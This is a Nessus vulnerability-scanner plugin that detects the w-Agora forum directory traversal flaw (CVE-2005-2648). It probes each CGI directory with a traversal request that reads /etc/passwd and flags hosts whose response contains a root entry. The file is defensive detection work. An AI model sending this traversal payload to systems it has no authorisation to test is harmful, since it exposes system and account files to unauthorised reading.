#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
# Ref:  matrix_killer
#
# This script is released under the GNU GPLv2
#
# Changes by Tenable:
#   - added CVE xref. (10/8/04)
#   - revised plugin title, added OSVDB ref (4/28/09)

include("compat.inc");

if (description) {
script_id(19474);
script_version("$Revision: 1.6 $");
script_cve_id("CVE-2005-2648");
script_bugtraq_id(14597);
script_xref(name:"OSVDB", value:"18831");

script_name(english:"w-Agora index.php site Parameter Traversal Arbitrary File Access");
  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote host has a directory traversal
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is running w-agora, a web-based forum application
written in PHP.

The remote version of this software is prone to directory traversal
attacks.  A remote attacker could request a specially crafted URL to
read arbitrary files on the remote system with the privileges of the
web server process."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0599.html"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to the latest version of this software."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
  );
  script_end_attributes();

script_summary(english:"Checks for directory traversal in w-Agora");
script_category(ACT_GATHER_INFO);
script_copyright(english:"This script is Copyright (C) 2005-2009 David Maciejak");
script_family(english:"CGI abuses");
script_dependencie("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");

exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir ( cgi_dirs() )
{
  req = string(dir, "/index.php?site=../../../../../../../../etc/passwd%00");
  req = http_get(item:req, port:port);
  result = http_keepalive_send_recv(port:port, data:req);
  if(result == NULL) exit(0);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_warning(port);
}
